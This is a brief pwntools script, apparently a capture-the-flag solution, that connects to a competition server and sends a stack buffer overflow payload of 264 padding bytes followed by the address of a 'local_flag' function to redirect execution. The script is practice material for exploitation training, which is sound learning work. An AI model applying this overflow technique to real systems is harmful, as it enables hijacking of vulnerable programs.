from pwn import *


e = ELF('./bof')

# p = process('./bof')
p = remote('buffer-overflow.ctfcompetition.com', 1337)

p.sendline('run')
p.sendline('A' * 264 + p32(e.symbols['local_flag']))
p.interactive()